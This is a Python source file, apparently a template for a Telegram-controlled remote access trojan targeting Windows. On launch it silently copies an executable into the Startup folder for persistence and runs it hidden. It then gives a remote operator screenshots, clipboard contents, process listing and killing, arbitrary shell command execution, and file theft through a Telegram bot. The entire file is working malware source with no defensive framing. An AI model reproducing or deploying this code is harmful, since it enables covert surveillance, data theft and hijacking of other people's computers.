from telegram.ext import *
from telegram import KeyboardButton, ReplyKeyboardMarkup
from mss import mss
import tempfile
import os
import psutil
import ctypes
import webbrowser
import pyperclip
import subprocess
import json
import shutil
import subprocess
import getpass

# Lokasi file script Python
script_dir = os.path.dirname(__file__)

# Folder Startup untuk pengguna saat ini
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

# Cari file dengan ekstensi .exe di direktori script
exe_files = [f for f in os.listdir(script_dir) if os.path.isfile(os.path.join(script_dir, f)) and f.lower().endswith('.exe')]

if not exe_files:
    pass
else:
    # Ambil nama file pertama yang ditemukan
    file_name = exe_files[0]
    file_to_copy = os.path.join(script_dir, file_name)

    # Cek apakah file sudah ada di folder Startup
    if os.path.exists(os.path.join(startup_folder, file_name)):
        pass
    else:
        try:
            # Salin file ke folder Startup
            shutil.copy(file_to_copy, startup_folder)
            pass

            # Jalankan file .exe tanpa menampilkan jendela konsol
            subprocess.Popen([file_to_copy], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception as e:
            pass

class TelegramBot:

    def __init__(self):
        # Simpan TOKEN dan CHAT_ID di sini
        self.TOKEN = "{token}"
        self.CHAT_ID = "{chat_id}"
        self.USERNAME = "{username}"

    def start_command(self, update, context):
        buttons = [[KeyboardButton("⚠ Screen status")], [KeyboardButton("🔒 Lock screen")], [KeyboardButton("📸 Take screenshot")],
                   [KeyboardButton("✂ Paste clipboard")], [KeyboardButton(
                       "📄 List process")], [KeyboardButton("💤 Sleep")],
                   [KeyboardButton("💡 More commands")]]
        context.bot.send_message(
            chat_id=self.CHAT_ID, text="I will do what you command.", reply_markup=ReplyKeyboardMarkup(buttons))

    def error(self, update, context):
        print(f"Update {update} caused error {context.error}")

    def take_screenshot(self):
        TEMPDIR = tempfile.gettempdir()
        os.chdir(TEMPDIR)
        with mss() as sct:
            sct.shot(mon=-1)
        return os.path.join(TEMPDIR, 'monitor-0.png')

    def handle_message(self, update, input_text):
        usr_msg = input_text.split()

        if input_text == "more commands":
            return """url <link>: open a link on the browser\nkill <proc>: terminate process\ncmd <command>: execute shell command\ncd <dir>: change directory\ndownload <file>: download a file"""

        if input_text == 'screen status':
            for proc in psutil.process_iter():
                if (proc.name() == "LogonUI.exe"):
                    return '🖥 Screen is Locked'
            return '🖥 Screen is Unlocked'

        if input_text == 'lock screen':
            try:
                ctypes.windll.user32.LockWorkStation()
                return "Screen locked successfully"
            except:
                return "Error while locking screen"

        if input_text == "take screenshot":
            update.message.bot.send_photo(
                chat_id=self.CHAT_ID, photo=open(self.take_screenshot(), 'rb'))
            return None

        if input_text == "paste clipboard":
            return pyperclip.paste()

        if input_text == "sleep":
            try:
                os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
                return "Windows was put to sleep"
            except:
                return "Cannot put Windows to sleep"

        if input_text == "list process":
            try:
                proc_list = []
                for proc in psutil.process_iter():
                    if proc.name() not in proc_list:
                        proc_list.append(proc.name())
                processes = "\n".join(proc_list)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
            return processes

        if usr_msg[0] == 'kill':
            proc_list = []
            for proc in psutil.process_iter():
                p = proc_list.append([proc.name(), str(proc.pid)])
            try:
                for p in proc_list:
                    if p[0] == usr_msg[1]:
                        psutil.Process(int(p[1])).terminate()
                return 'Process terminated successfully'
            except:
                return 'Error occured while killing the process'

        if usr_msg[0] == 'url':
            try:
                webbrowser.open(usr_msg[1])
                return 'Link opened successfully'
            except:
                return 'Error occured while opening link'

        if usr_msg[0] == "cd":
            if usr_msg[1]:
                try:
                    os.chdir(usr_msg[1])
                except:
                    return "Directory not found !"
                res = os.getcwd()
                if res:
                    return res

        if usr_msg[0] == "download":
            if usr_msg[1]:
                if os.path.exists(usr_msg[1]):
                    try:
                        document = open(usr_msg[1], 'rb')
                        update.message.bot.send_document(
                            self.CHAT_ID, document)
                    except:
                        return "Something went wrong !"

        if usr_msg[0] == "cmd":
            res = subprocess.Popen(
                usr_msg[1:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)
            stdout = res.stdout.read().decode("utf-8", 'ignore').strip()
            stderr = res.stderr.read().decode("utf-8", 'ignore').strip()
            if stdout:
                return (stdout)
            elif stderr:
                return (stderr)
            else:
                return ''

    def send_response(self, update, context):
        user_message = update.message.text
        if update.message.chat.username != self.USERNAME:
            print(f"[!] Unauthorized access attempt by {update.message.chat.username}")
            context.bot.send_message(
                chat_id=self.CHAT_ID, text="Nothing to see here.")
        else:
            user_message = user_message.encode('ascii', 'ignore').decode('ascii').strip().lower()
            response = self.handle_message(update, user_message)
            if response:
                if len(response) > 4096:
                    for i in range(0, len(response), 4096):
                        context.bot.send_message(
                            chat_id=self.CHAT_ID, text=response[i:i+4096])
                else:
                    context.bot.send_message(
                        chat_id=self.CHAT_ID, text=response)

    def start_bot(self):
        updater = Updater(self.TOKEN, use_context=True)
        dp = updater.dispatcher
        dp.add_handler(CommandHandler("start", self.start_command))
        dp.add_handler(MessageHandler(Filters.text, self.send_response))
        dp.add_error_handler(self.error)
        updater.start_polling()
        print("[+] Hallo Sir Started ")
        updater.idle()


bot = TelegramBot()
bot.start_bot()
